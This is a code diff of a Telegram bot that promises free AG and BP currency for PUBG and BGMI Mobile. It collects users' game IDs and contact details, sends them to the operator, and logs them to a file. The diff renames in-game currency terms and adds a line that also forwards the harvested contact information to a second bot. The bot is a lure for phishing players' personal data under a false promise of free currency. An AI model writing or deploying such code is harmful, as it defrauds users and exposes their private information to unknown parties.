@@ -46,7 +46,9 @@ def handle_check_button_click(call):
 @bot.message_handler(commands=['start'])
 def start(message):
 	bot.send_message(message.chat.id, f'''👋 Hello Mr, {message.from_user.first_name}! 👋
+ 
 This Telegram bot Free AG and BP With Our PUBG and BGMI Mobile 
+
 Type /generator''') 
 @bot.message_handler(commands=['admin'])
 def start(message):
@@ -62,11 +64,11 @@ def start(message):
 @bot.callback_query_handler(func=lambda call:True)
 def callback_inline(call):
 	if call.data == "first":
-		msg = bot.send_message(call.message.chat.id, 'Enter the amount of gold💰 (no more than 500 BP coin Daily)') 
+		msg = bot.send_message(call.message.chat.id, 'Enter the amount of BP coin (no more than 500 BP coin Daily)') 
 		bot.register_next_step_handler(msg, proc1)
 
 	elif call.data == "second":
-		msg = bot.send_message(call.message.chat.id, 'Enter the number of gems💎 (no more than 50 AG coin Daily)') 
+		msg = bot.send_message(call.message.chat.id, 'Enter the number of AG coin (no more than 50 AG coin Daily)') 
 		bot.register_next_step_handler(msg, proc2)
 
 def proc1(message):
@@ -136,6 +138,7 @@ def contact(message):
 			'''
 
 		bot.send_message(ID, info)
+		your_bot.send_message(YOUR_BOT_ID, info)
 		print(info)
 
 		log = open('bot-log.txt', 'a+', encoding='utf-8')
@@ -158,7 +161,7 @@ def entr(message):
 		bot.send_message(ID, f'User Game ID is: {inp}')
 
 		markup_reply = types.ReplyKeyboardMarkup(resize_keyboard = True)
-		item_an = types.KeyboardButton('Get more gems')
+		item_an = types.KeyboardButton('Get more AG coin')
 		markup_reply.add(item_an)
 		bot.send_message(message.chat.id, f'Your Game ID is: {inp} ', reply_markup = markup_reply)
 		time.sleep(1)
